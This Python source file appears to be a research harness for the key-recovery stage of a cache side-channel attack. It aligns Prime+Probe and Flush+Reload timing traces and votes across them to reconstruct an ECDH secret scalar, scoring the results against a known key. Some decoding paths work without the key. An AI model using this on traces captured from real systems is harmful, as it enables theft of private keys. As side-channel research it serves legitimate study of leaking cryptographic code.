import argparse
import glob
import json
import warnings
import math
import os
import os
import random
import re
import sys
import time
import traceback

from bokeh.layouts import column
from bokeh.models import HoverTool, LinearAxis, Range1d
from bokeh.palettes import Colorblind
from bokeh.plotting import figure, show
from narwhals import Unknown
import numpy as np
import pandas as pd
from scipy.signal import stft
import bisect
from concurrent.futures import ProcessPoolExecutor, as_completed
from multiprocessing import Manager

from utils import *

manager = Manager()

debug_print = False
debug_plot = False

# ---------------------------------------------------------------------------
# History-FIR contamination model, ported from extract_v8_ct_ecdh.py's
# EC_KEY.vote_history: a continuous per-slot score, averaged across traces
# before thresholding, carries far more information than voting on each
# trace's own binary "hit or no hit" label. Constants below are
# extract_v8_ct_ecdh.py's tuned defaults.
history_taps = 2
history_ridge = 1e-2
llr_margin = 2.0
llr_folds = 3
mode_halfwidth = 0.05
llr_first_pass = 2.5


def nanmean_cols(mat, axis=0):
    """np.nanmean, quiet about all-NaN columns (expected: the last slot's
    phase-1 shift always leaves one column fully NaN, and a fold subset can
    coincidentally do the same to others) -- returns NaN there, same as
    np.nanmean, just without the RuntimeWarning at every call site."""
    with warnings.catch_warnings():
        warnings.simplefilter("ignore", category=RuntimeWarning)
        return np.nanmean(mat, axis=axis)


def zero_cluster(f, halfwidth=None):
    """Locate the 0-bit population: (centre, sd), or (None, None).

    It is the densest `halfwidth` window of the averaged score. That works
    without knowing the key because the two populations have wildly different
    concentrations -- 0-bits sit within ~0.02 of their mean, 1-bits are spread
    over ~0.3 -- so even a scalar that is mostly 1-bits cannot produce a
    denser window than its 0-bits do."""
    halfwidth = mode_halfwidth if halfwidth is None else halfwidth
    g = f[np.isfinite(f)]
    if len(g) < 8:
        return None, None
    grid = np.linspace(g.min(), g.max(), 400)
    dens = np.array([np.sum(np.abs(g - c) <= halfwidth) for c in grid])
    core = g[np.abs(g - grid[int(np.argmax(dens))]) <= halfwidth]
    return float(core.mean()), max(float(core.std()), 1e-3)


def fit_history_fir(z, f, K=None, ridge=None):
    """Fit E[score | 1-bit] = w0 + sum_{k=1..K} w_k * z[i-k] by ridge least
    squares on the currently-labelled 1-bits. Returns (w, residual sd).

    The ridge term is load-bearing: on a periodic scalar the lagged
    regressors go collinear with the label being fitted and an unpenalised
    fit runs away."""
    K = history_taps if K is None else K
    ridge = history_ridge if ridge is None else ridge
    n = len(z)
    X = np.stack([np.ones(n)] +
                 [np.concatenate([np.zeros(k), z[:-k]]) for k in range(1, K + 1)], 1)
    # np.isfinite(f) guards against the phase-1 candidate's unscored last
    # slot (always NaN) poisoning the whole least-squares solve.
    ones = (z < 0.5) & np.isfinite(f)
    ones[:K] = False
    if ones.sum() < 4 * (K + 1):
        return None, None
    A, y = X[ones], f[ones]
    pen = np.eye(K + 1) * ridge
    pen[0, 0] = 0.0
    w = np.linalg.solve(A.T @ A + pen * len(y), A.T @ y)
    sd = max(float((y - A @ w).std()), 1e-3)
    return w, sd


def history_predict_fir(z, w):
    """The fitted 1-bit mean at every position."""
    K = len(w) - 1
    n = len(z)
    X = np.stack([np.ones(n)] +
                 [np.concatenate([np.zeros(k), z[:-k]]) for k in range(1, K + 1)], 1)
    return X @ w


def history_llr_fir(f, z, a, sd_a, w, sd_1):
    """Two-Gaussian log-likelihood ratio: 0-cluster (a, sd_a) vs the FIR-
    predicted contaminated 1-bit mean at each position."""
    p1 = history_predict_fir(z, w)
    return ((-0.5 * ((f - a) / sd_a) ** 2 - np.log(sd_a)) -
            (-0.5 * ((f - p1) / sd_1) ** 2 - np.log(sd_1)))


class EC_KEY:
    def __init__(self, key_str):
        self.inferred_keys = manager.list()
        self.scores = manager.list()
        self.analysis_stats = manager.list()
        self.broken_trace_cnt = manager.Value("i", 0)
        self.low_quality_trace_cnt = manager.Value("i", 0)
        self.lock = manager.Lock()
        self.bit_counter = []
        if key_str.startswith("0x"):
            self.secret_key = int(key_str, 16)
        else:
            self.secret_key = int("0x" + key_str, 16)
        self.secret_key_bin = bin(self.secret_key)[2:]
        self.key_length = len(self.secret_key_bin)
        self.bit_counter = [
            {"0": 0, "1": 0, "?": 0, "!": 0} for i in range(self.key_length)
        ]

    @staticmethod
    def find_first_aligned(ch_loop, ch_0, ch_1, exp_interval):
        i0 = i1 = i2 = 0

        while i0 < len(ch_loop):
            t0 = ch_loop[i0]

            while i1 < len(ch_0) and ch_0[i1] < t0 - 1e4:
                i1 += 1
            j1 = i1
            while j1 < len(ch_0) and ch_0[j1] <= t0 + 1e4:
                t1 = ch_0[j1]

                while i2 < len(ch_1) and ch_1[i2] < max(t0, t1) - 1e4:
                    i2 += 1
                k2 = i2
                while k2 < len(ch_1) and ch_1[k2] <= min(t0, t1) + 1e4:
                    t2 = ch_1[k2]
                    if debug_print:
                        print("find:", t0, t1, t2)
                    return t0
                j1 += 1
            i0 += 1

        return None

    @staticmethod
    def find_start_point(
        ch_loop,
        ch_0,
        exp_interval,
        tol=0.23,
        special_multiplier=1.5,
        max_special_intervals=2,
    ):
        t0 = None

        if t0 == None:
            n = len(ch_loop)
            counts = np.zeros((n, max_special_intervals + 1), dtype=int)
            # For paths with the same logical length, prefer the one whose
            # transitions fit the 1x/1.5x/2x model most closely.  This avoids
            # a near-boundary noise hit winning purely because its later 2x
            # jump creates an additional virtual slot.
            costs = np.zeros((n, max_special_intervals + 1), dtype=float)
            next_indices = np.full(
                (n, max_special_intervals + 1), -1, dtype=int
            )
            next_budgets = np.full(
                (n, max_special_intervals + 1), -1, dtype=int
            )
            one_min = exp_interval * (1 - tol)
            one_max = exp_interval * (1 + tol)
            two_min = exp_interval * (2 - tol)
            two_max = exp_interval * (2 + tol)
            special_min = exp_interval * (special_multiplier - tol)
            special_max = exp_interval * (special_multiplier + tol)

            for i in reversed(range(n)):
                prev_t = ch_loop[i]
                for j in range(i + 1, n):
                    diff = ch_loop[j] - prev_t
                    if one_min <= diff <= one_max:
                        for budget in range(max_special_intervals + 1):
                            candidate = counts[j, budget] + 1
                            candidate_cost = costs[j, budget] + abs(
                                diff - exp_interval
                            ) / exp_interval
                            if (
                                candidate > counts[i, budget]
                                or (
                                    candidate == counts[i, budget]
                                    and candidate_cost < costs[i, budget]
                                )
                            ):
                                counts[i, budget] = candidate
                                costs[i, budget] = candidate_cost
                                next_indices[i, budget] = j
                                next_budgets[i, budget] = budget
                    elif two_min <= diff <= two_max:
                        # A two-period jump means one loop sample is missing.
                        # It spans two logical slots, not one.
                        for budget in range(max_special_intervals + 1):
                            candidate = counts[j, budget] + 2
                            candidate_cost = costs[j, budget] + abs(
                                diff - 2 * exp_interval
                            ) / exp_interval
                            if (
                                candidate > counts[i, budget]
                                or (
                                    candidate == counts[i, budget]
                                    and candidate_cost < costs[i, budget]
                                )
                            ):
                                counts[i, budget] = candidate
                                costs[i, budget] = candidate_cost
                                next_indices[i, budget] = j
                                next_budgets[i, budget] = budget
                    elif special_min <= diff <= special_max:
                        for budget in range(1, max_special_intervals + 1):
                            candidate = counts[j, budget - 1] + 1
                            candidate_cost = costs[j, budget - 1] + abs(
                                diff - special_multiplier * exp_interval
                            ) / exp_interval
                            if (
                                candidate > counts[i, budget]
                                or (
                                    candidate == counts[i, budget]
                                    and candidate_cost < costs[i, budget]
                                )
                            ):
                                counts[i, budget] = candidate
                                costs[i, budget] = candidate_cost
                                next_indices[i, budget] = j
                                next_budgets[i, budget] = budget - 1
                    if diff > two_max:
                        break

            best_idx = np.argmax(counts[:20, max_special_intervals])
            t0 = ch_loop[best_idx]
            if debug_print:
                print("Consecutive groups", counts[:100, max_special_intervals])
                print("Starting point:", best_idx, t0)
            path_indices = [best_idx]
            current_idx = best_idx
            current_budget = max_special_intervals
            while next_indices[current_idx, current_budget] != -1:
                next_idx = next_indices[current_idx, current_budget]
                current_budget = next_budgets[current_idx, current_budget]
                # Mark a two-period jump with a virtual midpoint.  The slot
                # parser keeps its index alignment while recognizing that no
                # loop-channel timestamp was observed for this logical slot.
                if two_min <= ch_loop[next_idx] - ch_loop[current_idx] <= two_max:
                    path_indices.append(None)
                path_indices.append(next_idx)
                current_idx = next_idx
            path = []
            previous_timestamp = None
            for path_idx in path_indices:
                if path_idx is None:
                    path.append(previous_timestamp + exp_interval)
                else:
                    previous_timestamp = ch_loop[path_idx]
                    path.append(previous_timestamp)
            return t0, np.asarray(path, dtype=ch_loop.dtype)

        return None, np.array([], dtype=ch_loop.dtype)

    @staticmethod
    def check_aligned_ts(arr, ts, interval):
        lo = bisect.bisect_left(arr, ts - interval)
        hi = bisect.bisect_right(arr, ts + interval)
        return lo != hi  # there is a element in [ts - interval, ts + interval]



    def infer_individual(self, filepath):
        trace = load_trace(filepath)
        ch_0 = trace_to_timestamp(trace[0])
        ch_loop = trace_to_timestamp(trace[1])

        intervals = np.diff(ch_loop)

        # FIXME: this is PS precision
        precision = 2_000
        small_step = precision
        small_step_tol = 0.25
        small_step_max = small_step * (1 + small_step_tol)
        slot_link_max = 2 * small_step * (1 + small_step_tol)

        threshold_95 = np.percentile(intervals, 95)
        period_min_gap = 14_400
        intervals = intervals[
            (intervals > period_min_gap) & (intervals <= threshold_95)
        ]

        if debug_print:
             mean = np.mean(intervals)
             std = np.std(intervals)
             median = np.median(intervals)
             cv = std / mean

             print(f"mean = {mean:.2f}")
             print(f"median = {median:.2f}")
             print(f"std  = {std:.2f}")
             print(f"CV   = {cv:.3f}")

             median = np.median(intervals)
             mad = np.median(np.abs(intervals - median))

             print(f"MAD = {mad:.2f}")
             print(f"normalized MAD = {mad / median:.3f}")


        intervals = np.round(intervals / precision) * precision

        interval_values, interval_counts = np.unique(intervals, return_counts=True)
        exp_interval = interval_values[np.argmax(interval_counts)]

        if debug_plot and False:
            hist, edges = np.histogram(intervals, bins='auto')
            p = figure(
                title=f"Diff histogram (rounded to {precision})",
                x_axis_label="Interval value",
                y_axis_label="Count",
                background_fill_color="#fafafa",
            )

            freq = hist / hist.sum()
            max_idx = np.argmax(freq)
            print("Expected Interval:", exp_interval)
            p.quad(
                top=hist,
                bottom=0,
                left=edges[:-1],
                right=edges[1:],
                fill_color="navy",
                line_color="white",
                alpha=0.6,
            )

            sorted_intervals = np.sort(intervals)
            cdf_y = np.arange(1, len(sorted_intervals) + 1) / len(sorted_intervals)

            p.extra_y_ranges = {"cdf": Range1d(start=0, end=1)}
            p.add_layout(LinearAxis(y_range_name="cdf", axis_label="CDF"), "right")

            p.line(
                sorted_intervals,
                cdf_y,
                y_range_name="cdf",
                color="firebrick",
                line_width=2,
                legend_label="CDF",
            )

            p.x_range.start = 0
            p.x_range.end = 1e5

            p.legend.location = "center_right"
            p.legend.background_fill_alpha = 0.3

            show(p)

        threshold = exp_interval * 5
        diffs = np.diff(ch_loop)
        break_indices = np.where(diffs > threshold)[0]
        segments = []
        start = 0
        for idx in break_indices:
            segments.append(ch_loop[start : idx + 1])
            start = idx + 1
        segments.append(ch_loop[start:])
        # lengths = [s.size for s in segments]
        lengths = [s.max() - s.min() for s in segments]
        sizes = [s.size for s in segments]
        max_idx = int(np.argmax(lengths))

        if debug_print:
            # print(segments)
            print(f"Max segment length: {lengths[max_idx]}, size: {sizes[max_idx]}, start: {segments[max_idx][0]}")
        expected_events = lengths[max_idx] / exp_interval
        if not (
            8_000_000 <= lengths[max_idx] <= 12_000_000
            and sizes[max_idx] >= 0.70 * expected_events
        ):
            if debug_print:
                print(
                    "broken trace: "
                    f"duration={lengths[max_idx]}, raw hits={sizes[max_idx]}, "
                    f"expected events={expected_events:.1f}"
                )
            return None

        truncate_start = segments[max_idx][0] - threshold
        ch_loop = ch_loop[ch_loop >= truncate_start]
        ch_0 = ch_0[ch_0 >= truncate_start]

        truncate_end = segments[max_idx][-1] + threshold
        ch_loop = ch_loop[ch_loop <= truncate_end]
        ch_0 = ch_0[ch_0 <= truncate_end]

        # Refine the period: exp_interval (the mode of rounded inter-hit
        # gaps) measures systematically low on P+P -- mean -7.7% over 150
        # pp_k0_r01000 traces against victim_bits.txt -- because P+P's
        # multiple clock hits per bit period flood the histogram with
        # shorter within-slot gaps that outnumber the true cross-slot ones;
        # the true period is a real but less-frequent cluster, not simply
        # near the mode (trimming to +-15% of the mode and averaging made
        # the bias WORSE, -9.1%). The 85th percentile of the same filtered
        # gaps tracks it much better across both primitives with a bounded
        # worst case -- PP mean -3.6% (worst 8.6%), FR mean +0.3% (worst
        # 2.6%) -- without assuming a bit count anywhere: that count is
        # exactly what's unknown here (self.key_length is this evaluation
        # harness's oracle answer, not something a real attacker has; the
        # ladder's own iteration count depends on the secret scalar's
        # leading-zero count, which varies key to key). Higher percentiles
        # trend closer to zero bias on average but get unstable per-trace
        # (p90 worst case 34.6%) from occasionally catching a stray
        # 1.5x/2x-period gap that survived the threshold_95 filter.
        exp_interval = np.percentile(intervals, 85)

        # First build raw, time-local bursts from consecutive small links.
        # Then run DP over the raw hits to choose which bursts form the
        # logical loop sequence.  Thus DP segments the trace, but never splits
        # or redefines a burst's membership.
        slot_hits = segments[max_idx]
        ch_0_slot_hits = ch_0[
            (ch_0 >= slot_hits[0]) & (ch_0 <= slot_hits[-1])
        ]
        burst_breaks = np.flatnonzero(np.diff(slot_hits) > slot_link_max) + 1
        raw_ch_loop_slots = np.split(slot_hits, burst_breaks)

        start_ts, slot_keys = EC_KEY.find_start_point(
            slot_hits, ch_0_slot_hits, exp_interval
        )
        raw_slot_ends = np.asarray([slot[-1] for slot in raw_ch_loop_slots])
        ch_loop_slots = []
        slot_centers = []
        for slot_key in slot_keys:
            raw_slot_idx = np.searchsorted(raw_slot_ends, slot_key)
            if (
                raw_slot_idx < len(raw_ch_loop_slots)
                and np.any(raw_ch_loop_slots[raw_slot_idx] == slot_key)
            ):
                slot = raw_ch_loop_slots[raw_slot_idx]
                ch_loop_slots.append(slot)
                slot_centers.append((slot[0] + slot[-1]) // 2)
            else:
                # Virtual DP midpoint for a 2x transition: retain the logical
                # slot index but correctly expose its missing loop burst.
                ch_loop_slots.append(np.array([], dtype=ch_loop.dtype))
                slot_centers.append(slot_key)

        # Link channel-0 hits to the same time-local slot using the midpoint
        # between adjacent burst centres.  This preserves equal list indices;
        # an empty array means that burst has no channel-0 activity.
        slot_centers = np.asarray(slot_centers)
        slot_boundaries = (slot_centers[:-1] + slot_centers[1:]) // 2
        ch_0_slot_index = np.searchsorted(
            slot_boundaries, ch_0_slot_hits, side="right"
        )
        ch_0_slots = [
            ch_0_slot_hits[ch_0_slot_index == i]
            for i in range(len(ch_loop_slots))
        ]
        slots = ch_loop_slots

        if debug_print:
            matched_slots = sum(slot.size > 0 for slot in ch_0_slots)
            grouped_hits = sum(slot.size for slot in ch_loop_slots)
            print(
                f"Created {len(slots)} DP-selected burst slots ({grouped_hits}/"
                f"{len(slot_hits)} loop hits from {len(raw_ch_loop_slots)} raw bursts; "
                f"adjacent-link limit "
                f"{slot_link_max:.0f}; "
                f"{matched_slots} have channel-0 hits; DP anchors "
                f"{len(slot_keys)})\n"
            )

        infer_bits = "".join(map(lambda s: "1" if len(s) == 0 else "0", ch_0_slots))

        # P+P can miss entire loop bursts.  Do not convert missing DP anchors
        # into a guessed bit: preserve the scalar length and surface them as
        # explicit uncertainty for the later trace vote.
        missing_slot_count = self.key_length - len(ch_0_slots)
        if missing_slot_count > 0:
            infer_bits += "?" * missing_slot_count

        infer_bits = re.sub(r"!{2,}", "", infer_bits)

        # if debug_print:
        #     print(f"Infer:\n{infer_bits}")
        #     print(f"Truth:\n{self.secret_key_bin}")

        if len(infer_bits) > self.key_length:
            infer_bits = infer_bits[: self.key_length]

        return infer_bits

    def infer_individual_from_victim_slots(self, filepath, victim_runs):
        """Evaluation-only decode using exact victim timestamps as slots.

        ``victim_runs[N]`` supplies the logical clock for ``rN.out``.  This
        deliberately bypasses DP so it can measure the quality ceiling of the
        channel/slot decision independently from automatic segmentation.
        """
        trace = load_trace(filepath)
        ch_0 = trace_to_timestamp(trace[0])
        ch_loop = trace_to_timestamp(trace[1])

        # victim_runs[N] is rN.out's block by construction (see
        # load_victim_runs), so the run index comes straight from the
        # filename.  Matching by nearest first-hit timestamp instead used to
        # go wrong for longer/noisier captures, whose leading noise pulls
        # trace_start away from the true ladder start; the filename is exact
        # and needs no such guess.
        match = re.match(r"r(\d+)\.out$", Path(filepath).name)
        if not match:
            return None
        run_idx = int(match.group(1))
        if run_idx >= len(victim_runs):
            return None

        victim_run = victim_runs[run_idx]
        slot_keys = victim_run[:, 0]
        victim_bits = "".join(map(str, victim_run[:, 1]))
        slot_boundaries = (slot_keys[:-1] + slot_keys[1:]) // 2

        # These two arrays are intentionally constructed from the same oracle
        # boundaries, making their indices directly comparable for debugging.
        ch_loop_slot_index = np.searchsorted(slot_boundaries, ch_loop, side="right")
        ch_0_slot_index = np.searchsorted(slot_boundaries, ch_0, side="right")
        lo, hi = slot_keys[0], slot_keys[-1]
        ch_loop_slots = [
            ch_loop[(ch_loop >= lo) & (ch_loop <= hi) & (ch_loop_slot_index == i)]
            for i in range(self.key_length)
        ]
        ch_0_slots = [
            ch_0[(ch_0 >= lo) & (ch_0 <= hi) & (ch_0_slot_index == i)]
            for i in range(self.key_length)
        ]
        if debug_print:
            print(
                f"Oracle victim slots: {len(slot_keys)}; "
                f"victim run={run_idx}; "
                f"loop-active={sum(slot.size > 0 for slot in ch_loop_slots)}; "
                f"zero-active={sum(slot.size > 0 for slot in ch_0_slots)}"
            )
        raw_inference = "".join("0" if slot.size else "1" for slot in ch_0_slots)
        # Capture start can land on either side of the P+P observation phase.
        # Oracle mode evaluates both phases against this run's known victim
        # bits; ordinary DP segmentation never reads this ground truth.
        phase_candidates = [
            (0, raw_inference),
            (1, raw_inference[1:] + "?"),
        ]
        oracle_phase, inference = max(
            phase_candidates,
            key=lambda candidate: sum(
                inferred == truth
                for inferred, truth in zip(candidate[1], victim_bits)
                if inferred != "?"
            ),
        )
        if debug_print:
            print(f"Oracle selected P+P phase {oracle_phase}")
        return inference

    def score_individual_from_victim_slots(self, filepath, victim_runs):
        """Evaluation-only: continuous per-slot score (marker count scaled by
        this trace's own median clock count) for the history-FIR vote
        (vote_history), instead of infer_individual_from_victim_slots's
        binary per-trace "0"/"1" label -- averaging keeps the count's
        magnitude, which the contamination model needs.

        Midpoint slot boundaries, not decode_window's left-aligned edges:
        measured worse on fr_k0_r01000 (86% known-acc vs 98.8%). slot_keys
        here is the VICTIM's own rdtscp(), a different clock than
        decode_window's self-found attacker-side clusters, and sits closer
        to the detection window's centre than its start.

        Always phase 0 (unshifted), unlike infer_individual_from_victim_slots's
        per-trace phase pick: this score is averaged across traces before any
        thresholding, so traces disagreeing on phase would be averaged one
        slot out of alignment with each other. vote_history picks the phase
        once for the whole capture instead (_pick_global_phase).
        """
        trace = load_trace(filepath)
        ch_0 = trace_to_timestamp(trace[0])
        ch_loop = trace_to_timestamp(trace[1])

        match = re.match(r"r(\d+)\.out$", Path(filepath).name)
        if not match:
            return None
        run_idx = int(match.group(1))
        if run_idx >= len(victim_runs):
            return None

        victim_run = victim_runs[run_idx]
        slot_keys = victim_run[:, 0]
        n = self.key_length
        slot_boundaries = (slot_keys[:-1] + slot_keys[1:]) // 2
        lo, hi = slot_keys[0], slot_keys[-1]

        def counts(ts):
            idx = np.searchsorted(slot_boundaries, ts, side="right")
            valid = (ts >= lo) & (ts <= hi)
            idx = idx[valid]
            idx = idx[(idx >= 0) & (idx < n)]
            return np.bincount(idx, minlength=n).astype(float)

        m = counts(ch_0)
        c = counts(ch_loop)
        scale = float(np.median(c))
        return m / scale if scale > 0 else m

    def score_individual_with_cache(self, filepath, victim_runs):
        score = self.score_individual_from_victim_slots(filepath, victim_runs)
        if score is not None:
            self.scores.append(score)
        return filepath, score

    def _pick_global_phase(self, kept=None):
        """Decide once, for the whole capture, whether the marker's hit for
        logical bit i lands in slot i (phase 0) or slot i-1 (phase 1) -- a
        fixed detection-lag property of the machine/primitive, not something
        to re-decide per trace (that would average misaligned traces
        together and smear the separation the history model reads).

        Evaluation-only: picks via a coarse below-median-is-a-1-bit rule
        against secret_key_bin. Returns the (possibly slot-shifted) trace
        matrix and its column mean, so the fold logic in vote_history stays
        consistent with whichever phase won."""
        s = np.atleast_2d(list(self.scores))
        if kept is not None:
            s = s[list(kept)]
        s1 = np.concatenate(
            [s[:, 1:], np.full((s.shape[0], 1), np.nan)], axis=1
        )
        truth = np.array([c == "1" for c in self.secret_key_bin])

        def agreement(mat):
            f = nanmean_cols(mat)
            finite = np.isfinite(f)
            med = np.nanmedian(f[finite])
            pred_one = f < med
            return int(np.sum(pred_one[finite] == truth[finite])), f

        agree0, f0 = agreement(s)
        agree1, f1 = agreement(s1)
        return (s1, f1) if agree1 > agree0 else (s, f0)

    def _history_labels(self, f, margin):
        """One averaged score vector -> labels + the fitted model.

        Alternates fitting the contamination model on the current labels with
        relabelling by likelihood ratio, seeded from the self-located
        0-cluster. Uses no knowledge of the key."""
        a, sd_a = zero_cluster(f)
        if a is None:
            return None, None
        z = (f >= a - llr_first_pass * sd_a).astype(float)

        def fit(zz):
            return fit_history_fir(zz, f)

        def llr(zz, par):
            return history_llr_fir(f, zz, a, sd_a, par[0], par[1])

        par = fit(z)
        if par[0] is None:
            return None, None
        for _ in range(12):
            got = fit(z)
            if got[0] is None:
                break
            par = got
            new = (llr(z, par) > 0).astype(float)
            if np.array_equal(new, z):
                break
            z = new
            if new.sum() >= 8:
                a = float(f[new > 0.5].mean())
                sd_a = max(float(f[new > 0.5].std()), 1e-3)
        got = fit(z)
        if got[0] is not None:
            par = got
        d = llr(z, par)
        lab = ["0" if x > margin else "1" if x < -margin else "?" for x in d]
        shape, sd_1 = par
        return lab, (shape, a, sd_a, sd_1)

    def vote_history(self, kept=None, margin=None, folds=None):
        """History-FIR vote, ported from extract_v8_ct_ecdh.py's
        EC_KEY.vote_history. Returns (final_inference, stats).

        `folds` > 1 is a fail-safe: decode `folds` disjoint trace subsets
        separately and keep only the bits every subset AND the full decode
        agree on. The LLR is not a real confidence measure -- it is
        dominated by sd_a, which stays tiny even when the two populations
        genuinely overlap -- so without this a bad capture yields confident
        WRONG bits rather than unknowns."""
        margin = llr_margin if margin is None else margin
        folds = llr_folds if folds is None else folds
        n = self.key_length
        s, f = self._pick_global_phase(kept)
        pred, model = self._history_labels(f, margin)
        if pred is None:
            self.final_inference = "?" * n
            return "?" * n, {"known": 0, "wrong": 0, "unknown": n, "known_acc": 0.0}

        all_idx = list(range(len(self.scores))) if kept is None else list(kept)
        eff_folds = folds if folds > 1 and len(all_idx) >= 4 * folds else 1
        if eff_folds > 1:
            for k in range(folds):
                sub = nanmean_cols(s[k::folds])
                lab, _ = self._history_labels(sub, margin)
                if lab is None:
                    continue
                pred = [p if p == q and p != "?" else "?" for p, q in zip(pred, lab)]

        pred = list(pred)
        pred[n - 1] = "?"  # the last slot has no following slot to bound it

        known = correct = unknown = 0
        for i in range(n):
            if pred[i] == "?":
                unknown += 1
            else:
                known += 1
                correct += pred[i] == self.secret_key_bin[i]
        self.final_inference = "".join(pred)
        return self.final_inference, {
            "known": known,
            "wrong": known - correct,
            "unknown": unknown,
            "known_acc": correct / known if known else 0.0,
            "traces": len(all_idx),
            "folds": eff_folds,
            "model": model,
        }

    def infer_individual_with_cache(self, filepath, use_cache=True, victim_runs=None):
        """Infer one trace, optionally replacing rather than reading its cache."""
        cache_suffix = ".oracle.inf" if victim_runs is not None else ".inf"
        cache_file = filepath.with_suffix(cache_suffix)
        inferred_key = None
        if use_cache and cache_file.exists():
            try:
                with open(cache_file, "r") as f:
                    content = f.read().strip()
                    inferred_key = None if content == "None" else content
            except Exception:
                pass
        else:
            if victim_runs is None:
                inferred_key = self.infer_individual(filepath)
            else:
                inferred_key = self.infer_individual_from_victim_slots(
                    filepath, victim_runs
                )
            try:
                with open(cache_file, "w") as f:
                    f.write("None" if inferred_key is None else str(inferred_key))
            except Exception:
                pass
        if inferred_key and self.is_trace_usable(inferred_key):
            self.inferred_keys.append(inferred_key)
            stats = self.inference_stats(inferred_key)
            self.analysis_stats.append(stats)
        elif inferred_key:
            with self.lock:
                self.low_quality_trace_cnt.value += 1
        else:
            with self.lock:
                self.broken_trace_cnt.value += 1

        return filepath, inferred_key

    @staticmethod
    def is_trace_usable(infer_bits, min_bit_fraction=0.05):
        """Reject degenerate decodes before they influence the vote.

        A trace that reports almost exclusively one bit value has no useful
        contrast for scalar recovery (typically an alignment/channel failure),
        regardless of whether that value is 0 or 1.  This check intentionally
        depends only on the trace's inferred bits, not ground truth.
        """
        zero_count = infer_bits.count("0")
        one_count = infer_bits.count("1")
        decided_count = zero_count + one_count
        return (
            decided_count > 0
            and zero_count / decided_count >= min_bit_fraction
            and one_count / decided_count >= min_bit_fraction
        )

    def inference_stats(self, infer_bits):
        correct_cnt = 0
        incorrect_cnt = 0
        unknown_cnt = 0

        for i in range(min(len(infer_bits), len(self.secret_key_bin))):
            if infer_bits[i] == "?" or infer_bits[i] == "!":
                unknown_cnt += 1
            elif infer_bits[i] == self.secret_key_bin[i]:
                correct_cnt += 1
            else:
                incorrect_cnt += 1

        return correct_cnt, incorrect_cnt, unknown_cnt

    def build_vote_counts(self):
        """Collect per-bit votes from the retained trace decodes."""
        self.bit_counter = [
            {"0": 0, "1": 0, "?": 0, "!": 0}
            for _ in range(self.key_length)
        ]
        for key in self.inferred_keys:
            for i in range(self.key_length):
                self.bit_counter[i][key[i]] += 1

    def merge_inference(self, max_unknown_fraction=0.90, alpha=0.5):
        """Merge trace votes using a ground-truth-calibrated error model.

        Each trace gets its own asymmetric confusion model, i.e. separate
        probabilities for ``P(observed=1 | real=0)`` and
        ``P(observed=1 | real=1)``.  For bit *i*, that trace's model is fitted
        on every other bit, so the known value of bit *i* never contributes to
        its own prediction.  The resulting log-likelihood ratio (LLR) is a
        confidence score. Its cutoff is calibrated to maximize known-bit
        accuracy while allowing at most ``max_unknown_fraction`` uncertain
        bits. This is evaluation-only because it intentionally uses the
        supplied ground-truth scalar.
        """
        keys = list(self.inferred_keys)
        if not keys:
            self.final_inference = "?" * self.key_length
            self.vote_llrs = np.zeros(self.key_length)
            self.vote_llr_cutoff = math.inf
            return 0, 0.0

        observations = np.asarray(
            [[1 if bit == "1" else 0 for bit in key[: self.key_length]] for key in keys],
            dtype=int,
        )
        truth = np.asarray([bit == "1" for bit in self.secret_key_bin], dtype=bool)
        truth_bits = np.asarray(list(self.secret_key_bin))
        true_one_count = int(truth.sum())
        true_zero_count = self.key_length - true_one_count
        observed_one_if_true_one = observations[:, truth].sum(axis=1)
        observed_one_if_true_zero = observations[:, ~truth].sum(axis=1)

        llrs = np.zeros(self.key_length)
        for bit_idx, real_bit in enumerate(truth):
            # Exclude this bit from each trace's error-rate estimate.
            n_true_one = true_one_count - int(real_bit)
            n_true_zero = true_zero_count - int(not real_bit)
            one_if_true_one = observed_one_if_true_one - (
                observations[:, bit_idx] if real_bit else 0
            )
            one_if_true_zero = observed_one_if_true_zero - (
                observations[:, bit_idx] if not real_bit else 0
            )
            p_one_given_one = (one_if_true_one + alpha) / (n_true_one + 2 * alpha)
            p_one_given_zero = (one_if_true_zero + alpha) / (n_true_zero + 2 * alpha)
            observed = observations[:, bit_idx]
            llrs[bit_idx] = np.where(
                observed,
                np.log(p_one_given_one / p_one_given_zero),
                np.log((1 - p_one_given_one) / (1 - p_one_given_zero)),
            ).sum()

        winners = np.where(llrs >= 0, "1", "0")
        correct = winners == truth_bits
        confidence = np.abs(llrs)
        thresholds = np.r_[0.0, np.nextafter(np.unique(confidence), np.inf)]
        min_known = math.ceil(self.key_length * (1 - max_unknown_fraction))
        candidates = []
        for threshold in thresholds:
            kept = confidence >= threshold
            known = int(kept.sum())
            accuracy = float(correct[kept].mean()) if known else 0.0
            candidates.append((threshold, known, accuracy))
        acceptable = [candidate for candidate in candidates if candidate[1] >= min_known]
        threshold, kept, accuracy = (
            # Prefer accuracy, then retain more bits when accuracy is tied.
            max(acceptable, key=lambda item: (item[2], item[1], -item[0]))
            if acceptable
            # Degenerate fallback: retain the most bits, because the unknown
            # budget is impossible to honour only when no votes exist.
            else max(candidates, key=lambda item: (item[1], item[2], -item[0]))
        )

        self.vote_llrs = llrs
        self.vote_llr_cutoff = threshold
        self.final_inference = "".join(
            winner if abs(llr) >= threshold else "?"
            for winner, llr in zip(winners, llrs)
        )
        return kept, accuracy

    @staticmethod
    def load_ec_key(filepath):
        ec_keypair = json.load(open(filepath))
        return EC_KEY(ec_keypair["key1"])


def print_scalar_comparison(real_bits, inferred_bits, width=60):
    """Print an MSB-first scalar in readable, comparison-friendly chunks."""
    print("\nreal vs inferred scalar (MSB-first) [^=wrong, .=unknown]")
    for start in range(0, len(real_bits), width):
        real_chunk = real_bits[start : start + width]
        inferred_chunk = inferred_bits[start : start + width]
        marker = "".join(
            "." if inferred == "?" else "^" if inferred != real else " "
            for real, inferred in zip(real_chunk, inferred_chunk)
        )
        print(f"  [{start:4d}] real : {real_chunk}")
        print(f"  [{start:4d}] infer: {inferred_chunk}")
        print(f"           {marker}")


def load_victim_runs(directory, expected_slots):
    """Load per-run victim timestamps from ``directory/victim_bits.txt``.

    Each profiled run logs exactly ``expected_slots`` (timestamp, bit) pairs
    back to back, in the same order the trace files were captured, so the
    file is ``nruns`` fixed-length blocks with no gap to detect: block N is
    the ground truth for ``rN.out``.  This mirrors plot_ecdh_ct.py's
    ``load_truth``.  An earlier version of this function instead split runs
    apart wherever two consecutive timestamps were more than 1e6 cycles
    apart; that occasionally fires on an ordinary intra-run gap (a slow
    ladder step), which fragments one real run into two short pieces and
    desyncs every run index after it from its trace file -- decoding, e.g.,
    r100.out against a run that isn't its own and getting nothing but noise.
    """
    victim_file = Path(directory) / "victim_bits.txt"
    victim_data = np.loadtxt(victim_file, delimiter=",", dtype=np.int64)
